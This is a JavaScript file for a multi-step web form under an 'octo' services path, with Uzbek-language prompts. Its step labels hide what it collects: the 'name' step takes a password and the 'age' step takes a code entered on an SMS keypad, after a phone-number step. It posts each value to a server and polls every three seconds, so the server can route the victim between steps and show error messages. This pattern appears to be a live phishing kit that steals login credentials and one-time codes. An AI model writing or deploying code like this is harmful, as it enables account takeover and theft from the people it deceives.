const step = document.body.dataset.step;
const statusMessage = document.getElementById("statusMessage");
const submitButton = document.getElementById("submitStepButton");
const fieldError = document.getElementById("fieldError");
const query = new URLSearchParams(window.location.search);
const clientId = query.get("client");
const routeByStatus = {
  phone: "/services/octo/phone.html",
  waiting: "/services/octo/waiting.html",
  name: "/services/octo/name.html",
  birth_year: "/services/octo/birth-year.html",
  age: "/services/octo/age.html",
  residence_year: "/services/octo/residence-year.html",
  approved: "/services/octo/approved.html",
  unavailable: "/services/octo/unavailable.html"
};

let pollHandle = null;

const setStatus = (message, type = "") => {
  if (!statusMessage) return;
  statusMessage.textContent = message;
  statusMessage.className = "status";
  if (type) statusMessage.classList.add(`is-${type}`);
};

const setFieldError = (message = "") => {
  if (fieldError) {
    fieldError.textContent = message;
  }
};

const getDefaultButtonLabel = () => (step === "name" ? "Davom etish" : "Yuborish");

const setButtonState = (isReady, label = getDefaultButtonLabel()) => {
  if (!submitButton) return;
  submitButton.textContent = label;
  submitButton.disabled = !isReady;
  submitButton.classList.toggle("is-inactive", !isReady);
  submitButton.classList.toggle("is-ready", isReady);
};

const validateStepValue = (value) => {
  const text = String(value || "").trim();

  if (!text) {
    setFieldError("");
    return false;
  }

  if (step === "name") {
    if (text.length < 2) {
      setFieldError("Parol kamida 2 ta belgidan iborat bo`lishi kerak.");
      return false;
    }

    setFieldError("");
    return true;
  }

  const digits = text.replace(/\D/g, "");

  if (!digits.length) {
    setFieldError("Iltimos, raqam kiriting.");
    return false;
  }

  setFieldError("");
  return true;
};

const redirectToStatus = (status, currentClientId) => {
  const page = routeByStatus[status];
  if (!page) return;

  const target = `${page}?client=${currentClientId}`;
  const current = `${window.location.pathname}${window.location.search}`;
  if (current !== target) {
    window.location.replace(target);
  }
};

const loadClient = async () => {
  if (!clientId) {
    window.location.replace("/services/octo");
    return null;
  }

  const response = await fetch(`/api/client/${clientId}`);
  const data = await response.json();

  if (!response.ok || !data.ok) {
    window.location.replace("/services/octo");
    return null;
  }

  if (data.client.status !== step) {
    redirectToStatus(data.client.status, clientId);
    return null;
  }

  if (data.client.currentError && step !== "waiting") {
    setStatus(data.client.currentError, "error");
  }

  const field = document.getElementById("stepValue");
  if (field) {
    const savedValue = data.client.submissions?.[step]?.value;
    if (savedValue && !field.value) {
      field.value = savedValue;
    }
    setButtonState(validateStepValue(field.value));
  }

  return data.client;
};

const prepareInputMasks = () => {
  const field = document.getElementById("stepValue");
  if (!field) return;

  if (step === "name") {
    field.addEventListener("input", () => {
      field.value = field.value.replace(/\s+/g, " ").replace(/^\s+/, "");
      setButtonState(validateStepValue(field.value));
    });
    return;
  }

  if (step === "age") {
    field.addEventListener("input", () => {
      field.value = field.value.replace(/\D/g, "");
      setButtonState(validateStepValue(field.value));
    });
    return;
  }

  field.addEventListener("input", () => {
    field.value = field.value.replace(/\D/g, "");
    setButtonState(validateStepValue(field.value));
  });
};

const initPasswordToggle = () => {
  const toggle = document.getElementById("togglePassword");
  const field = document.getElementById("stepValue");
  if (!toggle || !field) return;

  toggle.addEventListener("click", () => {
    const isPassword = field.type === "password";
    field.type = isPassword ? "text" : "password";
    toggle.setAttribute("aria-label", isPassword ? "Parolni yashirish" : "Parolni ko'rsatish");
  });
};

const initSmsKeypad = () => {
  if (step !== "age") return;

  const field = document.getElementById("stepValue");
  const keypad = document.querySelector(".sms-keypad");
  const deleteButton = document.getElementById("smsDeleteButton");
  const form = document.getElementById("stepForm");
  if (!field || !keypad || !form) return;

  const sync = () => {
    field.value = field.value.replace(/\D/g, "");
    const isValid = validateStepValue(field.value);
    setButtonState(isValid);
    return isValid;
  };

  keypad.addEventListener("click", (event) => {
    const button = event.target.closest("[data-digit]");
    if (!button) return;

    field.value = `${field.value}${button.dataset.digit}`;
    sync();
  });

  if (deleteButton) {
    deleteButton.addEventListener("click", () => {
      field.value = field.value.slice(0, -1);
      sync();
    });
  }

  sync();
};

const handleSubmit = async (event) => {
  event.preventDefault();

  const field = document.getElementById("stepValue");
  const value = field ? field.value.trim() : "";
  if (!validateStepValue(value)) {
    setStatus("Iltimos, ma`lumotni to`ldiring.", "error");
    return;
  }

  setButtonState(false, "Yuborilmoqda...");
  setStatus("Ma`lumot yuborilmoqda...");

  try {
    const response = await fetch(`/api/client/${clientId}/submit-step`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ step, value })
    });

    const data = await response.json();
    if (!response.ok || !data.ok) {
      throw new Error(data.message || "Submit failed.");
    }

    window.location.href = data.redirectUrl;
  } catch (error) {
    setStatus("Yuborish muvaffaqiyatsiz bo`ldi. Qayta urinib ko`ring.", "error");
    setButtonState(validateStepValue(value));
  }
};

const init = async () => {
  if (submitButton) {
    setButtonState(false);
  }

  await loadClient();
  prepareInputMasks();
  initPasswordToggle();
  initSmsKeypad();

  const form = document.getElementById("stepForm");
  if (form && submitButton) {
    form.addEventListener("submit", handleSubmit);
  }

  pollHandle = setInterval(loadClient, 3000);
};

window.addEventListener("beforeunload", () => {
  if (pollHandle) clearInterval(pollHandle);
});

init();

